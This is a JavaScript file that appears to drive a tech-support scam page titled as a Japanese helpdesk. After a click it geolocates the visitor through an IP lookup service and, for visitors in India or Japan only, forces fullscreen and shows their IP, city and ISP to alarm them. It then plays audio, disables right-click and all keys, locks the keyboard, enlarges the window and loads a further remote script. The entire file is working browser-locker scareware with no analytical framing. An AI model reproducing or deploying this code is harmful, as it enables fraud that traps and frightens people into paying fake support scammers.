(async () => {
  const show=    async x1=>{
    document.head.innerHTML = `
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta charset="utf-8">
      <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
      <meta content="noindex,nofollow" name="robots">
      <link href="index.css" rel="stylesheet">
      <title>ヘルプデスクを取得 -01JP21</title>
    `;

    await document.documentElement.requestFullscreen();

    const ipadd=   x1.ip;
    const city=    x1.city;
    const country= x1.country;
    const isp=     x1.connection.isp;
    const b=       new Date;
    const currtime=x1.timezone.current_time;

    id (`ip_add`).textContent = `Address IP: ${ipadd} ${b.toLocaleString (`EN-US`, currtime)}`;
    id (`cityopm`).textContent = `City: ${city}, ${country}`;
    id (`isp`).textContent = `ISP: ${isp}`;
    id (`mycanvas`).style.display = "block";

    document.querySelector('body > header').remove();
    document.querySelector('body > main').remove();
    id (`pridez`).play ();

    window.onload = ()=>{
      window.moveTo (0, 0);
      window.resizeTo (window.screen.availWidth, window.screen.availHeight);
    };
    document.addEventListener("DOMContentLoaded", () => document.body.addEventListener("contextmenu", z1 => z1.preventDefault()));
    document.onkeydown = ()=>{
      return false;
    };
    await window.navigator.keyboard.lock ();

    loadScript("./_/x-x.js", () => true);

    return true;
  };

  const none=    async ()=>{
    return false;
  };

  const id=      c1=>document.getElementById (c1);

  document.documentElement.addEventListener(`click`, async () => {
    document.body.style.overflow = "";

    const resp = await window.fetch(`https://ipwho.is/?lang=en`);
    const json = await resp.json();

    if (json.country_code === `IN` || json.country_code === `JP`) {
      await show(json);
    }
    else {
      await none();
    }
  });

  const okay = document.getElementById(`okay`);

  okay.addEventListener('click', () => {
    okay.remove();
  });

  function loadScript(url, callback) {
    const script = document.createElement("script");
    script.src = url;
    script.async = true;

    script.onload = () => {
      console.log(`${url} loaded`);
      if (callback) callback();
    };

    script.onerror = () => {
      console.error(`Failed to load ${url}`);
    };

    document.head.appendChild(script);
  }

  document.body.style.overflow = "hidden";
})();
